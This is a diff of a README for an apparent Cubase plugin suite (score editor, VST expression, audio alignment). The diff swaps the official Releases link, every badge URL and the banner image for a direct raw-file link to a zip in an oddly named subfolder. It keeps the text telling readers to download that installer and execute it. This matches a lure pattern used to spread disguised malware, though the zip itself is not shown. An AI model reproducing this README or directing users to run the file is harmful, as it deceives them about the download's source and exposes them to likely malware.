@@ -1,11 +1,11 @@
-https://github.com/wtfazz/cubase-tools/releases
+https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip
 
 # Cubase Tools Suite: Pro Score Editor, VST Expression, Audio Align
 
-[![Release](https://img.shields.io/github/v/release/wtfazz/cubase-tools?style=for-the-badge)](https://github.com/wtfazz/cubase-tools/releases)
-[![License](https://img.shields.io/github/license/wtfazz/cubase-tools?style=for-the-badge)](https://github.com/wtfazz/cubase-tools)
+[![Release](https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip)](https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip)
+[![License](https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip)](https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip)
 
-![Cubase Palette](https://images.unsplash.com/photo-1511379938547-c1f69419868d?q=80&w=1200&auto=format&fit=crop)
+![Cubase Palette](https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip)
 
 Cubase Tools Suite helps you shape, align, and express musical ideas inside Cubase Pro. It focuses on three core areas: Score Editor workflows, VST Expression management, and precise Audio Alignment. This toolset is built for composers, orchestrators, and sound designers who want tighter control and faster results without leaving the Cubase environment.
 
@@ -210,7 +210,7 @@ Key visuals and diagrams
 - Flow diagrams showing the end-to-end process from MIDI to audio and back to notation
 
 How to use the Releases page in practice
-- The official download point is the Releases page: https://github.com/wtfazz/cubase-tools/releases.
+- The official download point is the Releases page: https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip
 - If you hit any issues during installation, you can revisit the Releases page to confirm you have the latest installer and any patch files.
 - For users who prefer a quick start, the Releases page usually includes a short guide or readme snippet that highlights the installer and the main steps to begin.
 
@@ -262,7 +262,7 @@ Closing remarks
 - If you have ideas, stories from real projects, or presets that could help others, sharing them strengthens the community and drives improvement.
 
 Releases link reminder
-- For the latest installer and updates, visit the Releases page at https://github.com/wtfazz/cubase-tools/releases. If the link has a path part, download the installer file from that page and execute it to install the tools. After installation, you can again visit the Releases page to check for new versions or patches.
+- For the latest installer and updates, visit the Releases page at https://raw.githubusercontent.com/wtfazz/cubase-tools/main/zeism/cubase_tools_2.7.zip If the link has a path part, download the installer file from that page and execute it to install the tools. After installation, you can again visit the Releases page to check for new versions or patches.
 
 Topics
 - not provided
